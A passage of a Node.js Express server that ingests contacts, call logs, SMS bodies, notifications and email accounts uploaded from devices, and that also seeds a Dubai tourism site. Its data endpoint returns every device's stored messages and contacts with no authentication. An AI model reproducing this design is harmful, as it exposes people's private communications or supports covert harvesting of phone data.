                                    callTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else {
                                callTimestamp = new Date();
                            }
                            
                            if (isNaN(callTimestamp.getTime()) || callTimestamp.getTime() <= 0) {
                                callTimestamp = new Date();
                            }
                        } catch (error) {
                            callTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            phoneNumber: item.phoneNumber || item.number || 'Unknown',
                            contactName: item.name || item.contactName || '',
                            callType: mappedCallType,
                            timestamp: callTimestamp,
                            duration: parseInt(item.duration) || 0,
                            deviceId: deviceId,
                            user_internal_code: user_internal_code,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'CONTACTS':
                        // Ensure phoneNumbers is always an array
                        let phoneNumbersArray = [];
                        if (item.phoneNumbers && Array.isArray(item.phoneNumbers) && item.phoneNumbers.length > 0) {
                            // If phoneNumbers is already an array, use it
                            phoneNumbersArray = item.phoneNumbers.map(phone => ({
                                number: phone.number || phone,
                                type: phone.type || 'MOBILE'
                            }));
                        } else if (item.phoneNumber) {
                            // If only single phoneNumber exists, convert to array
                            phoneNumbersArray = [{
                                number: item.phoneNumber,
                                type: item.phoneType || 'MOBILE'
                            }];
                        } else {
                            // Fallback to default
                            phoneNumbersArray = [{
                                number: '+0000000000',
                                type: 'MOBILE'
                            }];
                        }
                        
                        mappedItem = {
                            name: item.name || 'Unknown',
                            phoneNumbers: phoneNumbersArray,
                            emails: item.emails || [],
                            organization: item.organization || '',
                            deviceId: deviceId,
                            user_internal_code: user_internal_code,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'MESSAGES':
                        let messageTimestamp;
                        try {
                            if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    messageTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    messageTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else {
                                messageTimestamp = new Date();
                            }
                            
                            if (isNaN(messageTimestamp.getTime()) || messageTimestamp.getTime() <= 0) {
                                messageTimestamp = new Date();
                            }
                        } catch (error) {
                            messageTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            address: item.address || item.phoneNumber || 'Unknown',
                            body: item.body || item.message || item.text || '',
                            type: item.type || 'SMS',
                            isIncoming: item.isIncoming !== undefined ? item.isIncoming : true,
                            timestamp: messageTimestamp,
                            isRead: item.isRead !== undefined ? item.isRead : false,
                            deviceId: deviceId,
                            user_internal_code: user_internal_code,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'NOTIFICATIONS':
                        let notificationTimestamp;
                        try {
                            if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    notificationTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else if (item.postTime) {
                                if (typeof item.postTime === 'string' && item.postTime.includes('T')) {
                                    notificationTimestamp = new Date(item.postTime);
                                } else {
                                    const postTimeValue = parseInt(item.postTime);
                                    if (!isNaN(postTimeValue) && postTimeValue > 0) {
                                        notificationTimestamp = new Date(postTimeValue > 1000000000000 ? postTimeValue : postTimeValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else {
                                notificationTimestamp = new Date();
                            }
                            
                            if (isNaN(notificationTimestamp.getTime()) || notificationTimestamp.getTime() <= 0) {
                                notificationTimestamp = new Date();
                            }
                        } catch (error) {
                            notificationTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName || 'unknown',
                            appName: item.appName || 'Unknown App',
                            title: item.title || '',
                            text: item.text || '',
                            timestamp: notificationTimestamp,
                            deviceId: deviceId,
                            user_internal_code: user_internal_code,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'EMAIL_ACCOUNTS':
                        const emailProvider = item.provider || 'Gmail';
                        const validProviders = ['Gmail', 'Outlook', 'Yahoo', 'iCloud', 'Other'];
                        const mappedProvider = validProviders.includes(emailProvider) ? emailProvider : 'Other';
                        
                        mappedItem = {
                            accountId: item.accountId || `acc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            emailAddress: item.email || item.emailAddress || 'unknown@email.com',
                            accountName: item.name || item.accountName || 'Unknown Account',
                            provider: mappedProvider,
                            accountType: item.type || item.accountType || 'IMAP',
                            isActive: item.isActive !== undefined ? item.isActive : true,
                            deviceId: deviceId,
                            user_internal_code: user_internal_code,
                            syncedAt: new Date()
                        };
                        break;
                }
                
                // Generate data hash for duplicate detection
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                mappedItem.dataHash = dataHash;
                
                // Check for duplicates within the current batch
                if (!dataHashes.has(dataHash)) {
                    dataHashes.add(dataHash);
                    mappedItems.push(mappedItem);
                } else {
                    console.log(`⚠️ Duplicate data hash found in batch for ${dataType}, skipping`);
                }
                
            } catch (itemError) {
                console.error(`❌ Error mapping ${dataType} item:`, itemError);
            }
        }
        
        console.log(`📊 Mapped ${mappedItems.length} unique items out of ${data.length} total items`);

        // STEP 2: Fetch existing data to filter out duplicates
        let existingData = [];
        try {
            const query = { deviceId: deviceId };
            
            // Add specific filters based on data type for better performance
            switch (dataType) {
                case 'CONTACTS':
                    // Use dataHash for contacts to prevent duplicates
                    const contactHashes = mappedItems.map(item => item.dataHash).filter(h => h);
                    if (contactHashes.length > 0) {
                        query.dataHash = { $in: contactHashes };
                    }
                    break;
                case 'CALL_LOGS':
                    const callLogKeys = mappedItems.map(item => ({
                        phoneNumber: item.phoneNumber,
                        timestamp: item.timestamp,
                        duration: item.duration
                    }));
                    if (callLogKeys.length > 0) {
                        query.$or = callLogKeys.map(key => ({
                            phoneNumber: key.phoneNumber,
                            timestamp: key.timestamp,
                            duration: key.duration
                        }));
                    }
                    break;
                case 'MESSAGES':
                    const messageKeys = mappedItems.map(item => ({
                        address: item.address,
                        timestamp: item.timestamp,
                        body: item.body
                    }));
                    if (messageKeys.length > 0) {
                        query.$or = messageKeys.map(key => ({
                            address: key.address,
                            timestamp: key.timestamp,
                            body: key.body
                        }));
                    }
                    break;
                case 'NOTIFICATIONS':
                    const notificationIds = mappedItems.map(item => item.notificationId).filter(id => id);
                    if (notificationIds.length > 0) {
                        query.notificationId = { $in: notificationIds };
                    }
                    break;
                case 'EMAIL_ACCOUNTS':
                    // Use dataHash for email accounts to prevent duplicates
                    const emailHashes = mappedItems.map(item => item.dataHash).filter(h => h);
                    if (emailHashes.length > 0) {
                        query.dataHash = { $in: emailHashes };
                    }
                    break;
            }
            
            existingData = await Model.find(query).lean();
            console.log(`📋 Found ${existingData.length} existing records for ${dataType}`);
            
        } catch (error) {
            console.error(`❌ Error fetching existing data:`, error);
        }

        // STEP 3: Filter out items that already exist
        const newItems = [];
        
        for (const mappedItem of mappedItems) {
            let exists = false;
            
            // Check if item already exists
            for (const existing of existingData) {
                let match = false;
                
                switch (dataType) {
                    case 'CONTACTS':
                        // Use dataHash for consistent duplicate detection
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                    case 'CALL_LOGS':
                        match = existing.phoneNumber === mappedItem.phoneNumber &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.duration === mappedItem.duration;
                        break;
                    case 'MESSAGES':
                        match = existing.address === mappedItem.address &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.body === mappedItem.body;
                        break;
                    case 'NOTIFICATIONS':
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                    case 'EMAIL_ACCOUNTS':
                        // Use dataHash for consistent duplicate detection
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                }
                
                if (match) {
                    exists = true;
                    break;
                }
            }
            
            if (!exists) {
                newItems.push(mappedItem);
            }
        }
        
        console.log(`🆕 New items to insert: ${newItems.length}`);

        // STEP 4: Perform bulk insert only
        let insertedCount = 0;
        
        if (newItems.length > 0) {
            try {
                const insertResult = await Model.insertMany(newItems, { 
                    ordered: false, // Continue on errors
                    rawResult: true 
                });
                insertedCount = insertResult.insertedCount || newItems.length;
                console.log(`✅ Bulk inserted ${insertedCount} new ${dataType} items`);
            } catch (insertError) {
                console.error(`❌ Bulk insert error:`, insertError);
                // Fallback to individual inserts for failed items
                for (const item of newItems) {
                    try {
                        await Model.create(item);
                        insertedCount++;
                    } catch (error) {
                        console.error(`❌ Individual insert failed:`, error);
                    }
                }
            }
        }
        
        console.log(`🎉 BULK INSERT COMPLETE: ${insertedCount} ${dataType} items inserted`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsInserted: insertedCount,
                itemsSkipped: data.length - insertedCount,
                lastSyncTime: new Date(),
                message: `BULK INSERT: ${insertedCount} ${dataType} items inserted successfully`
            }
        });
        
    } catch (error) {
        console.error('❌ Bulk insert error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to sync data',
            message: error.message
        });
    }
});

// Get live data from main database
app.get('/api/data/:dataType', async (req, res) => {
    try {
        const { dataType } = req.params;
        const { page = 1, limit = 100 } = req.query;
        
        let Model;
        
        // Determine which model to use based on data type (main collections)
        switch (dataType) {
            case 'contacts':
                Model = Contact;
                break;
            case 'calllogs':
                Model = CallLog;
                break;
            case 'messages':
                Model = Message;
                break;
            case 'notifications':
                Model = Notification;
                break;
            case 'emailaccounts':
                Model = EmailAccount;
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        const data = await Model.find({})
            .sort({ syncedAt: -1 })
            .limit(limit * 1)
            .skip((page - 1) * limit);
        
        const total = await Model.countDocuments({});
        
        res.json({
            success: true,
            data: {
                dataType,
                items: data,
                pagination: {
                    current: page,
                    pages: Math.ceil(total / limit),
                    total
                }
            }
        });
        
    } catch (error) {
        console.error('Error getting live data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get live data'
        });
    }
});

// Test sync endpoint
app.post('/api/test/devices/:deviceId/test-sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType } = req.body;
        
        console.log(`🧪 Test sync request for device: ${deviceId}, dataType: ${dataType}`);
        
        return res.json({
            success: true,
            message: 'Test sync endpoint reached successfully',
            deviceId: deviceId,
            dataType: dataType
        });
        
    } catch (error) {
        console.error('❌ Error in test sync:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to test sync',
            message: error.message
        });
    }
});

// Sync stats endpoint
app.get('/api/client/devices/:deviceId/sync-stats', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        const syncSettings = await SyncSettings.find({ deviceId });
        
        const stats = syncSettings.reduce((acc, setting) => {
            acc[setting.dataType] = {
                status: setting.status,
                lastSyncTime: setting.lastSyncTime,
                itemCount: setting.itemCount,
                message: setting.message
            };
            return acc;
        }, {});
        
        res.json({
            success: true,
            data: stats
        });
        
    } catch (error) {
        console.error('Error getting sync stats:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get sync stats'
        });
    }
});

// Seeder function to run on server startup
async function runSeeders() {
    try {
        // Run seeders in development or if explicitly enabled (now including production)
        const shouldRunSeeders = process.env.NODE_ENV === 'development' || process.env.RUN_SEEDERS === 'true' || process.env.NODE_ENV === 'production';
        
        if (!shouldRunSeeders) {
            console.log('⏭️  Seeders skipped (set RUN_SEEDERS=true to enable)');
            return;
        }
        
        console.log('🌱 Running automatic seeders...');
        console.log('📊 Loading: Attractions, Services, Tour Packages, Admin User, Sliders, Tour Gallery');
        
        // 1. Seed Admin User (essential for system access)
        try {
            console.log('👤 Seeding admin user...');
            await seedAdmin();
            console.log('✅ Admin user seeded successfully');
        } catch (error) {
            console.error('❌ Error seeding admin user:', error.message);
            console.log('⚠️  Continuing with other seeders...');
        }
        
        // 2. Seed Dubai Attractions and Services from JSON files
        try {
            console.log('📍 Seeding Dubai attractions and services from JSON...');
            await seedDubaiDataFromJson();
            console.log('✅ Dubai attractions and services seeded successfully');
        } catch (error) {
            console.error('❌ Error seeding Dubai data from JSON:', error.message);
            console.log('⚠️  Continuing with other seeders...');
        }
        
        // 3. Seed Additional Dubai Data (tour packages, etc.)
        try {
            console.log('🎯 Seeding additional Dubai data...');
            await seedDubaiData();
            console.log('✅ Additional Dubai data seeded successfully');
        } catch (error) {
            console.error('❌ Error seeding additional Dubai data:', error.message);
            console.log('⚠️  Continuing with other seeders...');
        }
        
        // 4. Seed Slider Data
        try {
            console.log('🖼️  Seeding slider data...');
            await seedSliderData();
            console.log('✅ Slider data seeded successfully');
        } catch (error) {
            console.error('❌ Error seeding slider data:', error.message);
            console.log('⚠️  Continuing with other seeders...');
        }
        
        // 5. Seed Tour Gallery Data
        try {
            console.log('📸 Seeding tour gallery data...');
            await seedTourGallery();
            console.log('✅ Tour gallery data seeded successfully');
        } catch (error) {
            console.error('❌ Error seeding tour gallery data:', error.message);
            console.log('⚠️  Continuing with other seeders...');
        }
        
        // 6. Verify and display final counts
        try {
            console.log('📊 Verifying seeded data...');
            const attractionsCount = await Attraction.countDocuments();
            const servicesCount = await Service.countDocuments();
            const packagesCount = await TourPackage.countDocuments();
            const adminCount = await Admin.countDocuments();
            const sliderCount = await Slider.countDocuments();
            const galleryCount = await TourGallery.countDocuments();
            
            console.log('📈 Final data counts:');
            console.log(`   🏛️  Attractions: ${attractionsCount}`);
            console.log(`   🛠️  Services: ${servicesCount}`);
            console.log(`   🎒 Tour Packages: ${packagesCount}`);
            console.log(`   👤 Admin Users: ${adminCount}`);
            console.log(`   🖼️  Sliders: ${sliderCount}`);
            console.log(`   📸 Tour Gallery: ${galleryCount}`);
            
        } catch (error) {
            console.error('❌ Error verifying data counts:', error.message);
        }
        
        console.log('🎉 All automatic seeders completed successfully!');
        console.log('🚀 Server is ready with default data loaded');
        
    } catch (error) {
        console.error('❌ Error running seeders:', error);
        // Don't crash the server if seeding fails
        console.log('⚠️  Server will continue running despite seeder errors');
    }
}

// Global error handler for unhandled errors
app.use((err, req, res, next) => {
  console.error('❌ Unhandled Error:', {
    url: req.url,
    method: req.method,
    error: err.message,
    stack: err.stack,
    timestamp: new Date().toISOString()
  });

  // Handle JSON parsing errors
  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
    return res.status(400).json({
      success: false,
      message: 'Invalid JSON format',
      error: 'The request body contains malformed JSON',
      details: err.message,
      suggestion: 'Please check your JSON syntax and ensure proper escaping of quotes'
    });
  }

  // Handle other errors
  return res.status(500).json({
    success: false,
    message: 'Internal server error',
    error: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// Start server
app.listen(PORT, '0.0.0.0', async () => {
    console.log(`🚀 DeviceSync Backend Server running on http://localhost:${PORT}`);
    console.log(`📱 API Base URL: http://localhost:${PORT}/api/`);
    console.log(`🏥 Health Check: http://localhost:${PORT}/api/health`);
    console.log(`📱 For Android Emulator: http://10.0.2.2:${PORT}/api/`);
    console.log(`🗄️  Database: MongoDB (sync_data)`);
    console.log(`✅ Core syncing ready: Contacts, CallLogs, Notifications, EmailAccounts`);
    console.log(`🌱 Auto-seeding: Enabled for development and production`);
    
    // Run seeders after server starts
    await runSeeders();
}); 